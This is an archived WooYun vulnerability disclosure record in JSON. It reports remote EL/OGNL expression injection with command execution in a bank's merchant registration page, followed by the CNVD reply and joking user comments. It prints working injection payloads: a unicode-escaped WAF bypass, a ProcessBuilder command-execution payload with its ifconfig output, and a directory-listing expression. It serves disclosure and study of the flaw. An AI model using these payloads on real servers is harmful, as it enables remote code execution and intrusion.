{"id": 87357, "wybug_id": "wooyun-2016-0196160", "wybug_title": "工商银行某系统存在远程EL表达式注入漏洞(命令执行)", "wybug_corp": "工商银行", "wybug_author": "猪猪侠", "wybug_date": "2016-04-14 14:20", "wybug_open_date": "2016-06-02 15:30", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-02：\t细节向公众公开  简要描述： 这个漏洞只影响有钱人，乌云欠我一个闪电 详细说明：  #1 漏洞描述EL表达式语法允许开发人员开发自定义函数，以调用Java类的方法#2 影响服务器http://**.**.**.**/merchant/enterprise/registerComUserForward.jhtml#3 Paylod\ngroupName=1&papersType=${9999999-444}&papersValue=1&baseacct=1&retMsg=1&retCode=1\n\n\n   漏洞证明：  #4 绕过WAF\nhttp://**.**.**.**/merchant/enterprise/registerComUserForward.jhtmlcompanyName=999&groupName=&papersType=${\"a9999abbb\".toString\\u0028\\u0029}&papersValue=1&baseacct=1&retMsg=1&retCode=1\n\n\n#5 回显命令执行\ngroupName=1&papersType=${%23a%3d\\u0028new%20java.lang.ProcessBuilder\\u0028new%20java.lang.String[]{\\u0027/sbin/ifconfig\\u0027,\\u0027-a\\u0027}\\u0029\\u0029.start\\u0028\\u0029,%23b%3d%23a.getInputStream\\u0028\\u0029,%23c%3dnew%**.**.**.**.InputStreamReader\\u0028%23b\\u0029,%23d%3dnew%**.**.**.**.BufferedReader\\u0028%23c\\u0029,%23e%3dnew%20char[50000],%23d.read\\u0028%23e\\u0029,%23ringzero%3d%23context.get\\u0028\\u0027com.opensymphony.xwork2.dispatcher.HttpServletResponse\\u0027\\u0029,%23ringzero.getWriter\\u0028\\u0029.println\\u0028%23e\\u0029,%23ringzero.getWriter\\u0028\\u0029.flush\\u0028\\u0029,%23ringzero.getWriter\\u0028\\u0029.close\\u0028\\u0029}&papersValue=1&baseacct=1&retMsg=1&retCode=1\n\n${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'/sbin/ifconfig','-a'})).start(),#b=#a.getInputStream(),#c=new **.**.**.**.InputStreamReader(#b),#d=new **.**.**.**.BufferedReader(#c),#e=new char[50000],#d.read(#e),#ringzero=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#ringzero.getWriter().println(#e),#ringzero.getWriter().flush(),#ringzero.getWriter().close()}\n\neth5      Link encap:Ethernet  HWaddr 00:50:56:97:7A:74            inet addr:**.**.**.**  Bcast:**.**.**.**  Mask:**.**.**.**          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:5603928546 errors:0 dropped:0 overruns:0 frame:0          TX packets:8131434126 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:735168104896 (701110.9 Mb)  TX bytes:11750604019014 (11206249.2 Mb)lo        Link encap:Local Loopback            inet addr:**.**.**.**  Mask:**.**.**.**          UP LOOPBACK RUNNING  MTU:16436  Metric:1          RX packets:51371053 errors:0 dropped:0 overruns:0 frame:0          TX packets:51371053 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:25387430681 (24211.3 Mb)  TX bytes:25387430681 (24211.3 Mb)\n\n\n#6 列目录\ngroupName=1&papersType=${new **.**.**.**.File(\\u0027/\\u0027).listFiles()[1]}&papersValue=1&baseacct=1&retMsg=1&retCode=1\n   修复方案：  # 表达式不允许来自客户端调用   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-04-18 15:23 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT直接通报给对应银行集团公司,由其后续协调网站管理部门处置.  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-14 14:33 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:1553 漏洞数:373        | bye)\t\t \n  黑阔    \n     2016-04-14 14:34 |    \t\tcwkiller \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:33        | 闭关修炼)\t\t \n  我再也不欠你什么了    \n     2016-04-14 14:35 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  这个漏洞只影响有钱人，大富大贵洞    \n     2016-04-14 14:36 |    \t\tPiaCa \t\t\t( 普通白帽子  |\t\t\t        Rank:137 漏洞数:11        | 简单点!啪......嚓~~)\t\t \n  富贵洞    \n     2016-04-14 14:39 |    \t\tzsmj \t\t\t( 普通白帽子  |\t\t\t        Rank:243 漏洞数:34        | 蛛丝马迹！)\t\t \n  吓得我抓紧看看卡里余额有没有少    \n     2016-04-14 14:43 |    \t\tVinc \t\t\t( 普通白帽子  |\t\t\t        Rank:383 漏洞数:58        | 提莫队长正在待命！)\t\t \n  -    \n     2016-04-14 14:44 |    \t\twhynot \t\t\t( 普通白帽子  |\t\t\t        Rank:678 漏洞数:136        | 为你解冻冰河 为你放弃世界有何不可)\t\t \n  大富大贵洞 吓得我差点把卡里俩毛钱取出来    \n     2016-04-14 14:45 |    \t\t路人毛 \t\t\t( 普通白帽子  |\t\t\t        Rank:153 漏洞数:64        | 要想Rank给高，标题一定得屌)\t\t \n  !!!!    \n     2016-04-14 14:58 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:925 漏洞数:80        | 哈！躁起来！)\t\t \n  好姿势    \n     2016-04-14 15:00 |    \t\t黑吃黑 \t\t\t( 普通白帽子  |\t\t\t        Rank:165 漏洞数:32        | 不是因为看到了希望才去努力，而是努力了才...)\t\t \n  我表示关注    \n     2016-04-14 15:04 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  哈喇子    \n     2016-04-14 15:05 |    \t\t龚稳 \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:18        | 没有做不到的，只有不想做的)\t\t \n  唉  我是说我卡里怎么扫了18块  原来如此啊    \n     2016-04-14 15:06 |    \t\tSREAUDIO \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:11        | 努力学习，磨练技术)\t\t \n  @浩天 我有一个漏洞5天了还没审，求教    \n     2016-04-14 15:11 |    \t\t鱼化石 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:18        | 介绍不能为空)\t\t \n  吓得我赶紧看看卡里余额有没有多！    \n     2016-04-14 15:11 |    \t\tsysALong \t\t\t( 普通白帽子  |\t\t\t        Rank:386 漏洞数:76        | 在我们黑龙江这噶哒，就没有什么事是【撸串...)\t\t \n  就这 JC 还不查水表？  那就奇怪了。    \n     2016-04-14 15:14 |    \t\tTaro \t\t\t( 普通白帽子  |\t\t\t        Rank:329 漏洞数:81        | 走向最远的方向，哪怕前路迷茫；抱着最大的...)\t\t \n  嚇得我都不管是用工商銀行卡了    \n     2016-04-14 15:18 |    \t\tMartial \t\t\t( 普通白帽子  |\t\t\t        Rank:2616 漏洞数:366        | 竟然还有人冒充我，醉了，骗子QQ445697541...)\t\t \n  这个漏洞只影响有钱人,大家可以放心了 - -~!    \n     2016-04-14 15:35 |    \t\t苏安泽 \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:55        | 一个想成为演员的黑客~)\t\t \n  我收到我的银行卡消费信息，吓到我赶紧骑单车去银行查。结果...发现我卡里的5毛钱还在，真是吓死人了！    \n     2016-04-14 15:51 |    \t\txxsec \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:8        | kali，metasploit)\t\t \n  吓死我了，赶紧狂奔到银行查了下卡里的2块3毛8···    \n     2016-04-14 16:03 |    \t\t萨瓦迪卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:21        | 黑太子)\t\t \n  你裤腿侧面破了吧    \n     2016-04-14 16:17 |    \t\t路人毛 \t\t\t( 普通白帽子  |\t\t\t        Rank:153 漏洞数:64        | 要想Rank给高，标题一定得屌)\t\t \n  @苏安泽 你自行车呢？    \n     2016-04-14 16:22 |    \t\tby黑桃 \t\t\t( 实习白帽子  |\t\t\t        Rank:95 漏洞数:37        | 昨晚和老公大吵了一架，今天早上来大夷妈了...)\t\t \n  把楼上的人全部带走    \n     2016-04-14 16:33 |    \t\t兔八哥 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:6        | 我心飞 翔)\t\t \n  我卡里也有好几块啊，在村里也算是有钱人了，要不要报警，急，在线等    \n     2016-04-14 16:47 |    \t\t乐乐 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:62        | 一名信息安全员)\t\t \n  也来围观一下    \n     2016-04-14 16:57 |    \t\txiya \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        )\t\t \n  要不要报警，急，在线等    \n     2016-04-14 17:07 |    \t\t0h1in9e \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:20        | 林歌 | 峨眉山下修炼中的<网络安全></web开...)\t\t \n  吓得我赶紧看看卡里余额有没有多！    \n     2016-04-14 17:37 |    \t\t睾大强 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | there are five stages,denial,then anger,...)\t\t \n  什么时候能影响我啊 求备影响    \n     2016-04-14 17:43 |    \t\tsocket \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:20        | )\t\t \n  666搞银行。。    \n     2016-04-14 19:39 |    \t\t白骨夫人 \t\t\t( 普通白帽子  |\t\t\t        Rank:236 漏洞数:53        | 白骨夫人，白只做白的，骨就是骨气，夫人就...)\t\t \n  牛逼啊 ，，， 混个熟脸    \n     2016-04-14 19:49 |    \t\t带我玩 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:8        | 带我玩)\t\t \n  好牛逼    \n     2016-04-14 20:00 |    \t\t听听鸟叫 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | 看看天空)\t\t \n  沾点牛气    \n     2016-04-14 22:03 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  @白骨夫人     \n     2016-04-14 22:28 |    \t\t苏安泽 \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:55        | 一个想成为演员的黑客~)\t\t \n  @路人毛 卖了    \n     2016-04-19 07:58 |    \t\tJ3c0sk \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | *)\t\t \n  等死吧,劳资已经报警了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}